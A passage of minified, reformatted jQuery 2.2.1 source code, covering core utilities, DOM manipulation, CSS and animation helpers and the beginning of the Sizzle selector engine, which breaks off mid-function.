!(function (e, t) {
  "object" == typeof module && "object" == typeof module.exports
    ? (module.exports = e.document
        ? t(e, !0)
        : function (e) {
            if (!e.document) throw new Error("jQuery requires a window with a document");
            return t(e);
          })
    : t(e);
})("undefined" != typeof window ? window : this, function (e, t) {
  function n(e) {
    var t = !!e && "length" in e && e.length,
      n = ee.type(e);
    return "function" !== n && !ee.isWindow(e) && ("array" === n || 0 === t || ("number" == typeof t && t > 0 && t - 1 in e));
  }
  function i(e, t, n) {
    if (ee.isFunction(t))
      return ee.grep(e, function (e, i) {
        return !!t.call(e, i, e) !== n;
      });
    if (t.nodeType)
      return ee.grep(e, function (e) {
        return (e === t) !== n;
      });
    if ("string" == typeof t) {
      if (ue.test(t)) return ee.filter(t, e, n);
      t = ee.filter(t, e);
    }
    return ee.grep(e, function (e) {
      return Y.call(t, e) > -1 !== n;
    });
  }
  function o(e, t) {
    for (; (e = e[t]) && 1 !== e.nodeType; );
    return e;
  }
  function r() {
    B.removeEventListener("DOMContentLoaded", r), e.removeEventListener("load", r), ee.ready();
  }
  function s() {
    this.expando = ee.expando + s.uid++;
  }
  function a(e, t, n) {
    var i;
    if (void 0 === n && 1 === e.nodeType)
      if (((i = "data-" + t.replace(_e, "-$&").toLowerCase()), "string" == typeof (n = e.getAttribute(i)))) {
        try {
          n = "true" === n || ("false" !== n && ("null" === n ? null : +n + "" === n ? +n : Te.test(n) ? ee.parseJSON(n) : n));
        } catch (e) {}
        be.set(e, t, n);
      } else n = void 0;
    return n;
  }
  function l(e, t, n, i) {
    var o,
      r = 1,
      s = 20,
      a = i
        ? function () {
            return i.cur();
          }
        : function () {
            return ee.css(e, t, "");
          },
      l = a(),
      c = (n && n[3]) || (ee.cssNumber[t] ? "" : "px"),
      u = (ee.cssNumber[t] || ("px" !== c && +l)) && ke.exec(ee.css(e, t));
    if (u && u[3] !== c) {
      (c = c || u[3]), (n = n || []), (u = +l || 1);
      do {
        (u /= r = r || ".5"), ee.style(e, t, u + c);
      } while (r !== (r = a() / l) && 1 !== r && --s);
    }
    return n && ((u = +u || +l || 0), (o = n[1] ? u + (n[1] + 1) * n[2] : +n[2]), i && ((i.unit = c), (i.start = u), (i.end = o))), o;
  }
  function c(e, t) {
    var n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [];
    return void 0 === t || (t && ee.nodeName(e, t)) ? ee.merge([e], n) : n;
  }
  function u(e, t) {
    for (var n = 0, i = e.length; i > n; n++) we.set(e[n], "globalEval", !t || we.get(t[n], "globalEval"));
  }
  function d(e, t, n, i, o) {
    for (var r, s, a, l, d, p, f = t.createDocumentFragment(), h = [], g = 0, m = e.length; m > g; g++)
      if ((r = e[g]) || 0 === r)
        if ("object" === ee.type(r)) ee.merge(h, r.nodeType ? [r] : r);
        else if (Ie.test(r)) {
          for (s = s || f.appendChild(t.createElement("div")), a = (Ae.exec(r) || ["", ""])[1].toLowerCase(), l = Ne[a] || Ne._default, s.innerHTML = l[1] + ee.htmlPrefilter(r) + l[2], p = l[0]; p--; ) s = s.lastChild;
          ee.merge(h, s.childNodes), ((s = f.firstChild).textContent = "");
        } else h.push(t.createTextNode(r));
    for (f.textContent = "", g = 0; (r = h[g++]); )
      if (i && ee.inArray(r, i) > -1) o && o.push(r);
      else if (((d = ee.contains(r.ownerDocument, r)), (s = c(f.appendChild(r), "script")), d && u(s), n)) for (p = 0; (r = s[p++]); ) De.test(r.type || "") && n.push(r);
    return f;
  }
  function p() {
    return !0;
  }
  function f() {
    return !1;
  }
  function h() {
    try {
      return B.activeElement;
    } catch (e) {}
  }
  function g(e, t, n, i, o, r) {
    var s, a;
    if ("object" == typeof t) {
      for (a in ("string" != typeof n && ((i = i || n), (n = void 0)), t)) g(e, a, n, i, t[a], r);
      return e;
    }
    if ((null == i && null == o ? ((o = n), (i = n = void 0)) : null == o && ("string" == typeof n ? ((o = i), (i = void 0)) : ((o = i), (i = n), (n = void 0))), !1 === o)) o = f;
    else if (!o) return e;
    return (
      1 === r &&
        ((s = o),
        ((o = function (e) {
          return ee().off(e), s.apply(this, arguments);
        }).guid = s.guid || (s.guid = ee.guid++))),
      e.each(function () {
        ee.event.add(this, t, o, i, n);
      })
    );
  }
  function m(e, t) {
    return ee.nodeName(e, "table") && ee.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e;
  }
  function v(e) {
    return (e.type = (null !== e.getAttribute("type")) + "/" + e.type), e;
  }
  function y(e) {
    var t = Me.exec(e.type);
    return t ? (e.type = t[1]) : e.removeAttribute("type"), e;
  }
  function w(e, t) {
    var n, i, o, r, s, a, l, c;
    if (1 === t.nodeType) {
      if (we.hasData(e) && ((r = we.access(e)), (s = we.set(t, r)), (c = r.events))) for (o in (delete s.handle, (s.events = {}), c)) for (n = 0, i = c[o].length; i > n; n++) ee.event.add(t, o, c[o][n]);
      be.hasData(e) && ((a = be.access(e)), (l = ee.extend({}, a)), be.set(t, l));
    }
  }
  function b(e, t) {
    var n = t.nodeName.toLowerCase();
    "input" === n && Ee.test(e.type) ? (t.checked = e.checked) : ("input" === n || "textarea" === n) && (t.defaultValue = e.defaultValue);
  }
  function T(e, t, n, i) {
    t = K.apply([], t);
    var o,
      r,
      s,
      a,
      l,
      u,
      p = 0,
      f = e.length,
      h = f - 1,
      g = t[0],
      m = ee.isFunction(g);
    if (m || (f > 1 && "string" == typeof g && !J.checkClone && Le.test(g)))
      return e.each(function (o) {
        var r = e.eq(o);
        m && (t[0] = g.call(this, o, r.html())), T(r, t, n, i);
      });
    if (f && ((r = (o = d(t, e[0].ownerDocument, !1, e, i)).firstChild), 1 === o.childNodes.length && (o = r), r || i)) {
      for (a = (s = ee.map(c(o, "script"), v)).length; f > p; p++) (l = o), p !== h && ((l = ee.clone(l, !0, !0)), a && ee.merge(s, c(l, "script"))), n.call(e[p], l, p);
      if (a)
        for (u = s[s.length - 1].ownerDocument, ee.map(s, y), p = 0; a > p; p++)
          (l = s[p]), De.test(l.type || "") && !we.access(l, "globalEval") && ee.contains(u, l) && (l.src ? ee._evalUrl && ee._evalUrl(l.src) : ee.globalEval(l.textContent.replace(Re, "")));
    }
    return e;
  }
  function _(e, t, n) {
    for (var i, o = t ? ee.filter(t, e) : e, r = 0; null != (i = o[r]); r++) n || 1 !== i.nodeType || ee.cleanData(c(i)), i.parentNode && (n && ee.contains(i.ownerDocument, i) && u(c(i, "script")), i.parentNode.removeChild(i));
    return e;
  }
  function C(e, t) {
    var n = ee(t.createElement(e)).appendTo(t.body),
      i = ee.css(n[0], "display");
    return n.detach(), i;
  }
  function k(e) {
    var t = B,
      n = We[e];
    return n || (("none" !== (n = C(e, t)) && n) || ((t = (qe = (qe || ee("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentDocument).write(), t.close(), (n = C(e, t)), qe.detach()), (We[e] = n)), n;
  }
  function S(e, t, n) {
    var i,
      o,
      r,
      s,
      a = e.style;
    return (
      ("" !== (s = (n = n || Be(e)) ? n.getPropertyValue(t) || n[t] : void 0) && void 0 !== s) || ee.contains(e.ownerDocument, e) || (s = ee.style(e, t)),
      n && !J.pixelMarginRight() && ze.test(s) && Fe.test(t) && ((i = a.width), (o = a.minWidth), (r = a.maxWidth), (a.minWidth = a.maxWidth = a.width = s), (s = n.width), (a.width = i), (a.minWidth = o), (a.maxWidth = r)),
      void 0 !== s ? s + "" : s
    );
  }
  function x(e, t) {
    return {
      get: function () {
        return e() ? void delete this.get : (this.get = t).apply(this, arguments);
      },
    };
  }
  function E(e) {
    if (e in Ge) return e;
    for (var t = e[0].toUpperCase() + e.slice(1), n = Ve.length; n--; ) if ((e = Ve[n] + t) in Ge) return e;
  }
  function A(e, t, n) {
    var i = ke.exec(t);
    return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : t;
  }
  function D(e, t, n, i, o) {
    for (var r = n === (i ? "border" : "content") ? 4 : "width" === t ? 1 : 0, s = 0; 4 > r; r += 2)
      "margin" === n && (s += ee.css(e, n + Se[r], !0, o)),
        i
          ? ("content" === n && (s -= ee.css(e, "padding" + Se[r], !0, o)), "margin" !== n && (s -= ee.css(e, "border" + Se[r] + "Width", !0, o)))
          : ((s += ee.css(e, "padding" + Se[r], !0, o)), "padding" !== n && (s += ee.css(e, "border" + Se[r] + "Width", !0, o)));
    return s;
  }
  function N(t, n, i) {
    var o = !0,
      r = "width" === n ? t.offsetWidth : t.offsetHeight,
      s = Be(t),
      a = "border-box" === ee.css(t, "boxSizing", !1, s);
    if ((B.msFullscreenElement && e.top !== e && t.getClientRects().length && (r = Math.round(100 * t.getBoundingClientRect()[n])), 0 >= r || null == r)) {
      if (((0 > (r = S(t, n, s)) || null == r) && (r = t.style[n]), ze.test(r))) return r;
      (o = a && (J.boxSizingReliable() || r === t.style[n])), (r = parseFloat(r) || 0);
    }
    return r + D(t, n, i || (a ? "border" : "content"), o, s) + "px";
  }
  function I(e, t) {
    for (var n, i, o, r = [], s = 0, a = e.length; a > s; s++)
      (i = e[s]).style &&
        ((r[s] = we.get(i, "olddisplay")),
        (n = i.style.display),
        t
          ? (r[s] || "none" !== n || (i.style.display = ""), "" === i.style.display && xe(i) && (r[s] = we.access(i, "olddisplay", k(i.nodeName))))
          : ((o = xe(i)), ("none" === n && o) || we.set(i, "olddisplay", o ? n : ee.css(i, "display"))));
    for (s = 0; a > s; s++) (i = e[s]).style && ((t && "none" !== i.style.display && "" !== i.style.display) || (i.style.display = t ? r[s] || "" : "none"));
    return e;
  }
  function $(e, t, n, i, o) {
    return new $.prototype.init(e, t, n, i, o);
  }
  function O() {
    return (
      e.setTimeout(function () {
        Je = void 0;
      }),
      (Je = ee.now())
    );
  }
  function j(e, t) {
    var n,
      i = 0,
      o = { height: e };
    for (t = t ? 1 : 0; 4 > i; i += 2 - t) o["margin" + (n = Se[i])] = o["padding" + n] = e;
    return t && (o.opacity = o.width = e), o;
  }
  function H(e, t, n) {
    for (var i, o = (P.tweeners[t] || []).concat(P.tweeners["*"]), r = 0, s = o.length; s > r; r++) if ((i = o[r].call(n, t, e))) return i;
  }
  function P(e, t, n) {
    var i,
      o,
      r = 0,
      s = P.prefilters.length,
      a = ee.Deferred().always(function () {
        delete l.elem;
      }),
      l = function () {
        if (o) return !1;
        for (var t = Je || O(), n = Math.max(0, c.startTime + c.duration - t), i = 1 - (n / c.duration || 0), r = 0, s = c.tweens.length; s > r; r++) c.tweens[r].run(i);
        return a.notifyWith(e, [c, i, n]), 1 > i && s ? n : (a.resolveWith(e, [c]), !1);
      },
      c = a.promise({
        elem: e,
        props: ee.extend({}, t),
        opts: ee.extend(!0, { specialEasing: {}, easing: ee.easing._default }, n),
        originalProperties: t,
        originalOptions: n,
        startTime: Je || O(),
        duration: n.duration,
        tweens: [],
        createTween: function (t, n) {
          var i = ee.Tween(e, c.opts, t, n, c.opts.specialEasing[t] || c.opts.easing);
          return c.tweens.push(i), i;
        },
        stop: function (t) {
          var n = 0,
            i = t ? c.tweens.length : 0;
          if (o) return this;
          for (o = !0; i > n; n++) c.tweens[n].run(1);
          return t ? (a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c, t])) : a.rejectWith(e, [c, t]), this;
        },
      }),
      u = c.props;
    for (
      (function (e, t) {
        var n, i, o, r, s;
        for (n in e)
          if (((o = t[(i = ee.camelCase(n))]), (r = e[n]), ee.isArray(r) && ((o = r[1]), (r = e[n] = r[0])), n !== i && ((e[i] = r), delete e[n]), (s = ee.cssHooks[i]) && ("expand" in s)))
            for (n in ((r = s.expand(r)), delete e[i], r)) (n in e) || ((e[n] = r[n]), (t[n] = o));
          else t[i] = o;
      })(u, c.opts.specialEasing);
      s > r;
      r++
    )
      if ((i = P.prefilters[r].call(c, e, u, c.opts))) return ee.isFunction(i.stop) && (ee._queueHooks(c.elem, c.opts.queue).stop = ee.proxy(i.stop, i)), i;
    return (
      ee.map(u, H, c),
      ee.isFunction(c.opts.start) && c.opts.start.call(e, c),
      ee.fx.timer(ee.extend(l, { elem: e, anim: c, queue: c.opts.queue })),
      c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always)
    );
  }
  function L(e) {
    return (e.getAttribute && e.getAttribute("class")) || "";
  }
  function M(e) {
    return function (t, n) {
      "string" != typeof t && ((n = t), (t = "*"));
      var i,
        o = 0,
        r = t.toLowerCase().match(me) || [];
      if (ee.isFunction(n)) for (; (i = r[o++]); ) "+" === i[0] ? ((i = i.slice(1) || "*"), (e[i] = e[i] || []).unshift(n)) : (e[i] = e[i] || []).push(n);
    };
  }
  function R(e, t, n, i) {
    function o(a) {
      var l;
      return (
        (r[a] = !0),
        ee.each(e[a] || [], function (e, a) {
          var c = a(t, n, i);
          return "string" != typeof c || s || r[c] ? (s ? !(l = c) : void 0) : (t.dataTypes.unshift(c), o(c), !1);
        }),
        l
      );
    }
    var r = {},
      s = e === yt;
    return o(t.dataTypes[0]) || (!r["*"] && o("*"));
  }
  function q(e, t) {
    var n,
      i,
      o = ee.ajaxSettings.flatOptions || {};
    for (n in t) void 0 !== t[n] && ((o[n] ? e : i || (i = {}))[n] = t[n]);
    return i && ee.extend(!0, e, i), e;
  }
  function W(e, t, n, i) {
    var o;
    if (ee.isArray(t))
      ee.each(t, function (t, o) {
        n || _t.test(e) ? i(e, o) : W(e + "[" + ("object" == typeof o && null != o ? t : "") + "]", o, n, i);
      });
    else if (n || "object" !== ee.type(t)) i(e, t);
    else for (o in t) W(e + "[" + o + "]", t[o], n, i);
  }
  function F(e) {
    return ee.isWindow(e) ? e : 9 === e.nodeType && e.defaultView;
  }
  var z = [],
    B = e.document,
    U = z.slice,
    K = z.concat,
    Q = z.push,
    Y = z.indexOf,
    X = {},
    V = X.toString,
    G = X.hasOwnProperty,
    J = {},
    Z = "2.2.1",
    ee = function (e, t) {
      return new ee.fn.init(e, t);
    },
    te = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
    ne = /^-ms-/,
    ie = /-([\da-z])/gi,
    oe = function (e, t) {
      return t.toUpperCase();
    };
  (ee.fn = ee.prototype = {
    jquery: Z,
    constructor: ee,
    selector: "",
    length: 0,
    toArray: function () {
      return U.call(this);
    },
    get: function (e) {
      return null != e ? (0 > e ? this[e + this.length] : this[e]) : U.call(this);
    },
    pushStack: function (e) {
      var t = ee.merge(this.constructor(), e);
      return (t.prevObject = this), (t.context = this.context), t;
    },
    each: function (e) {
      return ee.each(this, e);
    },
    map: function (e) {
      return this.pushStack(
        ee.map(this, function (t, n) {
          return e.call(t, n, t);
        })
      );
    },
    slice: function () {
      return this.pushStack(U.apply(this, arguments));
    },
    first: function () {
      return this.eq(0);
    },
    last: function () {
      return this.eq(-1);
    },
    eq: function (e) {
      var t = this.length,
        n = +e + (0 > e ? t : 0);
      return this.pushStack(n >= 0 && t > n ? [this[n]] : []);
    },
    end: function () {
      return this.prevObject || this.constructor();
    },
    push: Q,
    sort: z.sort,
    splice: z.splice,
  }),
    (ee.extend = ee.fn.extend = function () {
      var e,
        t,
        n,
        i,
        o,
        r,
        s = arguments[0] || {},
        a = 1,
        l = arguments.length,
        c = !1;
      for ("boolean" == typeof s && ((c = s), (s = arguments[a] || {}), a++), "object" == typeof s || ee.isFunction(s) || (s = {}), a === l && ((s = this), a--); l > a; a++)
        if (null != (e = arguments[a]))
          for (t in e)
            (n = s[t]),
              s !== (i = e[t]) &&
                (c && i && (ee.isPlainObject(i) || (o = ee.isArray(i))) ? (o ? ((o = !1), (r = n && ee.isArray(n) ? n : [])) : (r = n && ee.isPlainObject(n) ? n : {}), (s[t] = ee.extend(c, r, i))) : void 0 !== i && (s[t] = i));
      return s;
    }),
    ee.extend({
      expando: "jQuery" + (Z + Math.random()).replace(/\D/g, ""),
      isReady: !0,
      error: function (e) {
        throw new Error(e);
      },
      noop: function () {},
      isFunction: function (e) {
        return "function" === ee.type(e);
      },
      isArray: Array.isArray,
      isWindow: function (e) {
        return null != e && e === e.window;
      },
      isNumeric: function (e) {
        var t = e && e.toString();
        return !ee.isArray(e) && t - parseFloat(t) + 1 >= 0;
      },
      isPlainObject: function (e) {
        return !("object" !== ee.type(e) || e.nodeType || ee.isWindow(e) || (e.constructor && !G.call(e.constructor.prototype, "isPrototypeOf")));
      },
      isEmptyObject: function (e) {
        var t;
        for (t in e) return !1;
        return !0;
      },
      type: function (e) {
        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? X[V.call(e)] || "object" : typeof e;
      },
      globalEval: function (e) {
        var t,
          n = eval;
        (e = ee.trim(e)) && (1 === e.indexOf("use strict") ? (((t = B.createElement("script")).text = e), B.head.appendChild(t).parentNode.removeChild(t)) : n(e));
      },
      camelCase: function (e) {
        return e.replace(ne, "ms-").replace(ie, oe);
      },
      nodeName: function (e, t) {
        return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
      },
      each: function (e, t) {
        var i,
          o = 0;
        if (n(e)) for (i = e.length; i > o && !1 !== t.call(e[o], o, e[o]); o++);
        else for (o in e) if (!1 === t.call(e[o], o, e[o])) break;
        return e;
      },
      trim: function (e) {
        return null == e ? "" : (e + "").replace(te, "");
      },
      makeArray: function (e, t) {
        var i = t || [];
        return null != e && (n(Object(e)) ? ee.merge(i, "string" == typeof e ? [e] : e) : Q.call(i, e)), i;
      },
      inArray: function (e, t, n) {
        return null == t ? -1 : Y.call(t, e, n);
      },
      merge: function (e, t) {
        for (var n = +t.length, i = 0, o = e.length; n > i; i++) e[o++] = t[i];
        return (e.length = o), e;
      },
      grep: function (e, t, n) {
        for (var i = [], o = 0, r = e.length, s = !n; r > o; o++) !t(e[o], o) !== s && i.push(e[o]);
        return i;
      },
      map: function (e, t, i) {
        var o,
          r,
          s = 0,
          a = [];
        if (n(e)) for (o = e.length; o > s; s++) null != (r = t(e[s], s, i)) && a.push(r);
        else for (s in e) null != (r = t(e[s], s, i)) && a.push(r);
        return K.apply([], a);
      },
      guid: 1,
      proxy: function (e, t) {
        var n, i, o;
        return (
          "string" == typeof t && ((n = e[t]), (t = e), (e = n)),
          ee.isFunction(e)
            ? ((i = U.call(arguments, 2)),
              ((o = function () {
                return e.apply(t || this, i.concat(U.call(arguments)));
              }).guid = e.guid = e.guid || ee.guid++),
              o)
            : void 0
        );
      },
      now: Date.now,
      support: J,
    }),
    "function" == typeof Symbol && (ee.fn[Symbol.iterator] = z[Symbol.iterator]),
    ee.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
      X["[object " + t + "]"] = t.toLowerCase();
    });
  var re = (function (e) {
    function t(e, t, n, i) {
      var o,
        r,
        s,
        a,
        l,
        c,
        d,
        f,
        h = t && t.ownerDocument,
        g = t ? t.nodeType : 9;
      if (((n = n || []), "string" != typeof e || !e || (1 !== g && 9 !== g && 11 !== g))) return n;
      if (!i && ((t ? t.ownerDocument || t : q) !== $ && I(t), (t = t || $), j)) {
        if (11 !== g && (c = ve.exec(e)))
          if ((o = c[1])) {
            if (9 === g) {
              if (!(s = t.getElementById(o))) return n;
              if (s.id === o) return n.push(s), n;
            } else if (h && (s = h.getElementById(o)) && M(t, s) && s.id === o) return n.push(s), n;
          } else {
            if (c[2]) return J.apply(n, t.getElementsByTagName(e)), n;
            if ((o = c[3]) && T.getElementsByClassName && t.getElementsByClassName) return J.apply(n, t.getElementsByClassName(o)), n;
          }
        if (T.qsa && !U[e + " "] && (!H || !H.test(e))) {
          if (1 !== g) (h = t), (f = e);
          else if ("object" !== t.nodeName.toLowerCase()) {
            for ((a = t.getAttribute("id")) ? (a = a.replace(we, "\\$&")) : t.setAttribute("id", (a = R)), r = (d = S(e)).length, l = pe.test(a) ? "#" + a : "[id='" + a + "']"; r--; ) d[r] = l + " " + p(d[r]);
            (f = d.join(",")), (h = (ye.test(e) && u(t.parentNode)) || t);
          }
          if (f)
            try {
              return J.apply(n, h.querySelectorAll(f)), n;
            } catch (e) {
            } finally {
              a === R && t.removeAttribute("id");
            }
        }
      }
      return E(e.replace(ae, "$1"), t, n, i);
    }
    function n() {
      var e = [];
      return function t(n, i) {
        return e.push(n + " ") > _.cacheLength && delete t[e.shift()], (t[n + " "] = i);
      };
    }
    function i(e) {
      return (e[R] = !0), e;
    }
    function o(e) {
      var t = $.createElement("div");
      try {
        return !!e(t);
      } catch (e) {
        return !1;
      } finally {
        t.parentNode && t.parentNode.removeChild(t), (t = null);
      }
    }
    function r(e, t) {
      for (var n = e.split("|"), i = n.length; i--; ) _.attrHandle[n[i]] = t;
    }
    function s(e, t) {
      var n = t && e,
        i = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || Q) - (~e.sourceIndex || Q);
      if (i) return i;
      if (n) for (; (n = n.nextSibling); ) if (n === t) return -1;
      return e ? 1 : -1;
    }
    function a(e) {
      return function (t) {
        return "input" === t.nodeName.toLowerCase() && t.type === e;
      };
    }
    function l(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && t.type === e;
      };
    }
    function c(e) {
      return i(function (t) {
        return (
          (t = +t),
          i(function (n, i) {
            for (var o, r = e([], n.length, t), s = r.length; s--; ) n[(o = r[s])] && (n[o] = !(i[o] = n[o]));
          })
        );
      });
    }
    function u(e) {
      return e && void 0 !== e.getElementsByTagName && e;
    }
    function d() {}
    function p(e) {
      for (var t = 0, n = e.length, i = ""; n > t; t++) i += e[t].value;
      return i;
    }
    function f(e, t, n) {
      var i = t.dir,
        o = n && "parentNode" === i,
        r = F++;
      return t.first
        ? function (t, n, r) {
            for (; (t = t[i]); ) if (1 === t.nodeType || o) return e(t, n, r);
          }
        : function (t, n, s) {
            var a,
              l,
              c,
              u = [W, r];
            if (s) {
              for (; (t = t[i]); ) if ((1 === t.nodeType || o) && e(t, n, s)) return !0;
            } else
              for (; (t = t[i]); )
                if (1 === t.nodeType || o) {
                  if ((a = (l = (c = t[R] || (t[R] = {}))[t.uniqueID] || (c[t.uniqueID] = {}))[i]) && a[0] === W && a[1] === r) return (u[2] = a[2]);
                  if (((l[i] = u), (u[2] = e(t, n, s)))) return !0;
                }
          };
    }
    function h(e) {
      return e.length > 1
        ? function (t, n, i) {
            for (var o = e.length; o--; ) if (!e[o](t, n, i)) return !1;
            return !0;
          }
        : e[0];
    }
    function g(e, n, i) {
      for (var o = 0, r = n.length; r > o; o++) t(e, n[o], i);
      return i;
    }
    function m(e, t, n, i, o) {
      for (var r, s = [], a = 0, l = e.length, c = null != t; l > a; a++) (r = e[a]) && (!n || n(r, i, o)) && (s.push(r), c && t.push(a));
      return s;
    }
    function v(e, t, n, o, r, s) {
      return (
        o && !o[R] && (o = v(o)),
        r && !r[R] && (r = v(r, s)),
        i(function (i, s, a, l) {
          var c,
            u,
            d,
            p = [],
            f = [],
            h = s.length,
            v = i || g(t || "*", a.nodeType ? [a] : a, []),
            y = !e || (!i && t) ? v : m(v, p, e, a, l),
            w = n ? (r || (i ? e : h || o) ? [] : s) : y;
          if ((n && n(y, w, a, l), o)) for (c = m(w, f), o(c, [], a, l), u = c.length; u--; ) (d = c[u]) && (w[f[u]] = !(y[f[u]] = d));
          if (i) {
            if (r || e) {
              if (r) {
                for (c = [], u = w.length; u--; ) (d = w[u]) && c.push((y[u] = d));
                r(null, (w = []), c, l);
              }
              for (u = w.length; u--; ) (d = w[u]) && (c = r ? ee(i, d) : p[u]) > -1 && (i[c] = !(s[c] = d));
            }
          } else (w = m(w === s ? w.splice(h, w.length) : w)), r ? r(null, s, w, l) : J.apply(s, w);
        })
      );
    }
    function y(e) {
      for (
        var t,
          n,
          i,
          o = e.length,
          r = _.relative[e[0].type],
          s = r || _.relative[" "],
          a = r ? 1 : 0,
          l = f(
            function (e) {
              return e === t;
            },
            s,
            !0
          ),
          c = f(
            function (e) {
              return ee(t, e) > -1;
            },
            s,
            !0
          ),
          u = [
            function (e, n, i) {
              var o = (!r && (i || n !== A)) || ((t = n).nodeType ? l(e, n, i) : c(e, n, i));
              return (t = null), o;
            },
          ];
        o > a;
        a++
      )
        if ((n = _.relative[e[a].type])) u = [f(h(u), n)];
        else {
          if ((n = _.filter[e[a].type].apply(null, e[a].matches))[R]) {
            for (i = ++a; o > i && !_.relative[e[i].type]; i++);
            return v(a > 1 && h(u), a > 1 && p(e.slice(0, a - 1).concat({ value: " " === e[a - 2].type ? "*" : "" })).replace(ae, "$1"), n, i > a && y(e.slice(a, i)), o > i && y((e = e.slice(i))), o > i && p(e));
          }
          u.push(n);
        }
      return h(u);
    }
    function w(e, n) {
      var o = n.length > 0,
        r = e.length > 0,
        s = function (i, s, a, l, c) {
          var u,
            d,
            p,
            f = 0,
            h = "0",
            g = i && [],
            v = [],
            y = A,
            w = i || (r && _.find.TAG("*", c)),
            b = (W += null == y ? 1 : Math.random() || 0.1),
            T = w.length;
          for (c && (A = s === $ || s || c); h !== T && null != (u = w[h]); h++) {
            if (r && u) {
              for (d = 0, s || u.ownerDocument === $ || (I(u), (a = !j)); (p = e[d++]); )
                if (p(u, s || $, a)) {
                  l.push(u);
                  break;
                }
              c && (W = b);
            }
            o && ((u = !p && u) && f--, i && g.push(u));
          }
          if (((f += h), o && h !== f)) {
            for (d = 0; (p = n[d++]); ) p(g, v, s, a);
            if (i) {
              if (f > 0) for (; h--; ) g[h] || v[h] || (v[h] = V.call(l));
              v = m(v);
            }
            J.apply(l, v), c && !i && v.length > 0 && f + n.length > 1 && t.uniqueSort(l);
          }
          return c && ((W = b), (A = y)), g;
        };
      return o ? i(s) : s;
    }
    var b,
      T,
      _,
      C,
      k,
      S,
      x,
      E,
      A,
      D,
      N,
      I,
      $,
      O,
      j,
      H,
      P,
      L,
      M,
      R = "sizzle" + 1 * new Date(),
      q = e.document,
      W = 0,
      F = 0,
      z = n(),
      B = n(),
      U = n(),
      K = function (e, t) {
        return e === t && (N = !0), 0;
      },
      Q = 1 << 31,
      Y = {}.hasOwnProperty,
      X = [],
      V = X.pop,
      G = X.push,
      J = X.push,
      Z = X.slice,
      ee = function (e, t) {
        for (var n = 0, i = e.length; i > n; n++) if (e[n] === t) return n;
        return -1;
      },
      te = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      ne = "[\\x20\\t\\r\\n\\f]",
      ie = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
      oe = "\\[" + ne + "*(" + ie + ")(?:" + ne + "*([*^$|!~]?=)" + ne + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + ie + "))|)" + ne + "*\\]",
      re = ":(" + ie + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + oe + ")*)|.*)\\)|)",
      se = new RegExp(ne + "+", "g"),
      ae = new RegExp("^" + ne + "+|((?:^|[^\\\\])(?:\\\\.)*)" + ne + "+$", "g"),
      le = new RegExp("^" + ne + "*," + ne + "*"),
      ce = new RegExp("^" + ne + "*([>+~]|" + ne + ")" + ne + "*"),
      ue = new RegExp("=" + ne + "*([^\\]'\"]*?)" + ne + "*\\]", "g"),
      de = new RegExp(re),
      pe = new RegExp("^" + ie + "$"),
      fe = {
        ID: new RegExp("^#(" + ie + ")"),
        CLASS: new RegExp("^\\.(" + ie + ")"),
        TAG: new RegExp("^(" + ie + "|[*])"),
        ATTR: new RegExp("^" + oe),
        PSEUDO: new RegExp("^" + re),
        CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + ne + "*(even|odd|(([+-]|)(\\d*)n|)" + ne + "*(?:([+-]|)" + ne + "*(\\d+)|))" + ne + "*\\)|)", "i"),
        bool: new RegExp("^(?:" + te + ")$", "i"),
        needsContext: new RegExp("^" + ne + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + ne + "*((?:-\\d)?\\d*)" + ne + "*\\)|)(?=[^-]|$)", "i"),
      },
      he = /^(?:input|select|textarea|button)$/i,
      ge = /^h\d$/i,
      me = /^[^{]+\{\s*\[native \w/,
      ve = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      ye = /[+~]/,
      we = /'|\\/g,
      be = new RegExp("\\\\([\\da-f]{1,6}" + ne + "?|(" + ne + ")|.)", "ig"),
      Te = function (e, t, n) {
        var i = "0x" + t - 65536;
        return i != i || n ? t : 0 > i ? String.fromCharCode(i + 65536) : String.fromCharCode((i >> 10) | 55296, (1023 & i) | 56320);
      },
      _e = function () {
        I();
      };
    try {
      J.apply((X = Z.call(q.childNodes)), q.childNodes), X[q.childNodes.length].nodeType;
    } catch (e) {
      J = {
        apply: X.length
          ? function (e, t) {
              G.apply(e, Z.call(t));
            }
          : function (e, t) {
              for (var n = e.length, i = 0; (e[n++] = t[i++]); );
              e.length = n - 1;
            },
      };
    }
    for (b in ((T = t.support = {}),
    (k = t.isXML = function (e) {
      var t = e && (e.ownerDocument || e).documentElement;
      return !!t && "HTML" !== t.nodeName;
    }),
    (I = t.setDocument = function (e) {
      var t,
        n,
        i = e ? e.ownerDocument || e : q;
      return i !== $ && 9 === i.nodeType && i.documentElement
        ? ((O = ($ = i).documentElement),
          (j = !k($)),
          (n = $.defaultView) && n.top !== n && (n.addEventListener ? n.addEventListener("unload", _e, !1) : n.attachEvent && n.attachEvent("onunload", _e)),
          (T.attributes = o(function (e) {
            return (e.className = "i"), !e.getAttribute("className");
          })),
          (T.getElementsByTagName = o(function (e) {
            return e.appendChild($.createComment("")), !e.getElementsByTagName("*").length;
          })),
